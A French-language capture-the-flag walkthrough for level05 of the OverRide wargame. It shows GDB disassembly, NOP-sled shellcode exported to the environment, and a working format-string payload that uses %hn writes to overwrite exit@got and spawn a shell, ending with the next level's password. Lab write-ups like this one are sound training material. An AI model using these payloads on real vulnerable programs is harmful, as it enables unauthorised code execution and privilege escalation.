@@ -1,0 +1,321 @@
+*** Source ***
+
+https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
+https://stackoverflow.com/questions/64088865/how-do-i-run-a-program-under-gdb-with-an-environment-variable-set-to-the-content
+
+************
+
+level05@OverRide:~$ ./level05
+aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+aaaa 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be (nil) 0xffffffff 0xffffd744 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+
+Pour trouver notre buffer => 10eme place (0x61616161)
+
+
+- Trouver l'adresse de exit dans la got -
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048444 <+0>:	push   ebp
+   0x08048445 <+1>:	mov    ebp,esp
+   0x08048447 <+3>:	push   edi
+   0x08048448 <+4>:	push   ebx
+   0x08048449 <+5>:	and    esp,0xfffffff0
+   0x0804844c <+8>:	sub    esp,0x90
+   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
+   0x0804845d <+25>:	mov    eax,ds:0x80497f0
+   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
+   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
+   0x0804846e <+42>:	lea    eax,[esp+0x28]
+   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
+   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
+   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
+   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
+   0x08048487 <+67>:	lea    eax,[esp+0x28]
+   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
+   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
+   0x08048495 <+81>:	cmp    al,0x40
+   0x08048497 <+83>:	jle    0x80484cb <main+135>
+   0x08048499 <+85>:	lea    eax,[esp+0x28]
+   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
+   0x080484a7 <+99>:	cmp    al,0x5a
+   0x080484a9 <+101>:	jg     0x80484cb <main+135>
+   0x080484ab <+103>:	lea    eax,[esp+0x28]
+   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
+   0x080484b9 <+117>:	mov    edx,eax
+   0x080484bb <+119>:	xor    edx,0x20
+   0x080484be <+122>:	lea    eax,[esp+0x28]
+   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
+   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
+   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
+   0x080484da <+150>:	lea    eax,[esp+0x28]
+   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
+   0x080484e6 <+162>:	mov    edx,eax
+   0x080484e8 <+164>:	mov    eax,0x0
+   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
+   0x080484f1 <+173>:	mov    edi,edx
+   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
+   0x080484f5 <+177>:	mov    eax,ecx
+   0x080484f7 <+179>:	not    eax
+   0x080484f9 <+181>:	sub    eax,0x1
+   0x080484fc <+184>:	cmp    ebx,eax
+   0x080484fe <+186>:	jb     0x8048487 <main+67>
+   0x08048500 <+188>:	lea    eax,[esp+0x28]
+   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
+   0x08048507 <+195>:	call   0x8048340 <printf@plt>
+   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>
+End of assembler dump.
+(gdb) x/3i 0x8048370
+   0x8048370 <exit@plt>:	jmp    DWORD PTR ds:0x80497e0
+   0x8048376 <exit@plt+6>:	push   0x18
+   0x804837b <exit@plt+11>:	jmp    0x8048330
+(gdb) x/gx 0x80497e0
+0x80497e0 <exit@got.plt>:	0x0804838608048376
+(gdb) x/x 0x80497e0
+0x80497e0 <exit@got.plt>:	0x0804838608048376
+
+Ou bien =>
+
+level05@OverRide:~$ objdump -R level05 | grep 'exit'
+080497e0 R_386_JUMP_SLOT   exit
+
+adresse de exit = 0x80497e0
+
+
+- Trouver l'adresse du buffer -
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048444 <+0>:	push   ebp
+   0x08048445 <+1>:	mov    ebp,esp
+   0x08048447 <+3>:	push   edi
+   0x08048448 <+4>:	push   ebx
+   0x08048449 <+5>:	and    esp,0xfffffff0
+   0x0804844c <+8>:	sub    esp,0x90
+   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
+   0x0804845d <+25>:	mov    eax,ds:0x80497f0
+   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
+   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
+   0x0804846e <+42>:	lea    eax,[esp+0x28]
+   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
+=> 0x08048475 <+49>:	call   0x8048350 <fgets@plt>
+   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
+   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
+   0x08048487 <+67>:	lea    eax,[esp+0x28]
+   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
+   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
+   0x08048495 <+81>:	cmp    al,0x40
+   0x08048497 <+83>:	jle    0x80484cb <main+135>
+   0x08048499 <+85>:	lea    eax,[esp+0x28]
+   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
+   0x080484a7 <+99>:	cmp    al,0x5a
+   0x080484a9 <+101>:	jg     0x80484cb <main+135>
+   0x080484ab <+103>:	lea    eax,[esp+0x28]
+   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
+   0x080484b9 <+117>:	mov    edx,eax
+   0x080484bb <+119>:	xor    edx,0x20
+   0x080484be <+122>:	lea    eax,[esp+0x28]
+   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
+   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
+   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
+   0x080484da <+150>:	lea    eax,[esp+0x28]
+   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
+   0x080484e6 <+162>:	mov    edx,eax
+   0x080484e8 <+164>:	mov    eax,0x0
+   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
+   0x080484f1 <+173>:	mov    edi,edx
+   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
+   0x080484f5 <+177>:	mov    eax,ecx
+   0x080484f7 <+179>:	not    eax
+   0x080484f9 <+181>:	sub    eax,0x1
+   0x080484fc <+184>:	cmp    ebx,eax
+   0x080484fe <+186>:	jb     0x8048487 <main+67>
+   0x08048500 <+188>:	lea    eax,[esp+0x28]
+   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
+   0x08048507 <+195>:	call   0x8048340 <printf@plt>
+   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>
+End of assembler dump.
+(gdb) i r eax
+eax            0xffffd678	-10632
+(gdb) c
+Continuing.
+AAAA
+aaaa
+
+Breakpoint 2, 0x08048513 in main ()
+(gdb) x/s 0xffffd678
+0xffffd678:	 "aaaa\n"
+
+ - Trouver l'adresse de system -
+
+(gdb) p system
+$22 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) x/s 0xf7e6aed0
+0xf7e6aed0 <system>:	 "\203\354\034\211t$\024\213t$ \211\\$\020菮\016"
+
+- Trouver l'adresse de '/bin/sh' - 
+
+Il faut run pour pouvoir utiliser 'info proc map', on break au debut de main et run
+
+(gdb) r null
+Starting program: /home/users/level05/level05 null
+
+Breakpoint 1, 0x08048444 in main ()
+(gdb) info proc map
+process 13403
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level05/level05
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level05/level05
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fda000 0xf7fdb000     0x1000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, +99999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+
+
+ADRESSE EXIT TO LITTLE ENDIAN
+
+0x80497e0
+\xe0\x97\x04\x08
+
+2 byte plus loin 0x80497e0
+\xe2\x97\x04\x08
+export SHELLCODE=$(python -c 'print "\x90"*100 +"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+
+
+
+******************
+**** Solution ****
+******************
+
+Ecrire l'adresse de notre shellcode la ou à l'adresse de exit@got grace a une format string attack
+-> Pour verfier on break après le printf et on check à l'adresse de exit pour voir si on a bien celle de notre shellcode
+
+(gdb) b*0x0804850c
+Breakpoint 1 at 0x804850c
+(gdb) r <<< $(python exploit.py)
+Starting program: /home/users/level05/level05 <<< $(python exploit.py)
+...
+Breakpoint 1, 0x0804850c in main ()
+(gdb) x/wx 0x80497e0
+0x80497e0 <exit@got.plt>:	0xffffd875
+
+**************************************
+**** Trouver l'adresse du de exit ****
+**************************************
+
+level05@OverRide:~$ objdump -R level05 | grep 'exit'
+080497e0 R_386_JUMP_SLOT   exit
+
+adresse de exit => 0x80497e0
+
+*********************************************************************************************
+**** On export le shellcode dans l'environment du terminal sur lequl nous allons faire l'exploit ****
+*********************************************************************************************
+
+level05@OverRide:~$ export SHELLCODE=$(python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
+
+****************************************
+**** Trouver l'adresse du shellcode ****
+****************************************
+
+level05@OverRide:~$ gdb -q ./level05
+Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
+(gdb) b*main
+Breakpoint 1 at 0x8048444
+(gdb) x/s *((char **)environ)
+No symbol table is loaded.  Use the "file" command.       => ne fonctionne pas car la mémoire n'est pas encore loader il faut run le binaire
+(gdb) r
+Starting program: /home/users/level05/level05
+
+Breakpoint 1, 0x08048444 in main ()
+(gdb) x/s *environ
+0xffffd837:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343P\211\342S\211\341\260\v̀"
+(gdb) x/20i 0xffffd837
+   0xffffd837:	push   %ebx
+   0xffffd838:	dec    %eax
+   0xffffd839:	inc    %ebp
+   0xffffd83a:	dec    %esp
+   0xffffd83b:	dec    %esp
+   0xffffd83c:	inc    %ebx
+   0xffffd83d:	dec    %edi
+   0xffffd83e:	inc    %esp
+   0xffffd83f:	inc    %ebp
+   0xffffd840:	cmp    $0x90909090,%eax
+   0xffffd845:	nop
+   0xffffd846:	nop
+   0xffffd847:	nop
+   0xffffd848:	nop
+   0xffffd849:	nop
+   0xffffd84a:	nop
+   0xffffd84b:	nop
+   0xffffd84c:	nop
+   0xffffd84d:	nop
+   0xffffd84e:	nop
+   ...
+   SHELLCODE
+
+adresse du shellcode => n'importe quel adresse nop
+
+
+**************************************
+**** Ecrire l'exploit avec printf ****
+**************************************
+
+Il sera composé de : adresse de exit (4 bytes) | adresse de exit+2 (4 bytes) | %(adresse PART1 DE SH)x | %10$hn | %(adresse PART2 DE SH)x | %11$hn
+
+*
+%10$hn
+%11$hn
+Car en test avec ./level05 > aaaa %x... on voit que notre buffer commmence sur le 10ème ce sera donc l'argument de notre 10éme %n
+
+
+exit = 0x80497e0
+shellcode = 0xffffd875
+
+L'adresse du shellcode étant trop grande pour l'écrire avec un seul formateur %n nous allons l'écrire en 2 fois avec %hn en slidant l'adresse de exit 2 bytes par 2 bytes (à l'envers car little endian)
+
+1 - Première partie
+   -> 2 dernier bytes de l'adresse du shellcode = 0xd875 à écrire sur $exit
+2 - Deuxième partie
+   -> 2 premier bytes de l'adresse du shellcode = 0xffff à écrire sur $exit + 2
+
+Ce qui nous donne le calcul suivant 
+
+PART1 = 0xd875 - 0x8 (car on a déjà écrit 8 bytes avec les adresses de exit)
+PART2 = 0xffff - 0xd875
+
+=> EXIT EXIT+2 %55405x %10$hn %10122x %11$hn
+
+%55405x %10$hn %10122x %11$hn
+
+level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55405x" + "%10$hn" + "%10122x" + "%11$hn"';cat) | ./level05
+whoami
+level06
+pwd
+/home/users/level05
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
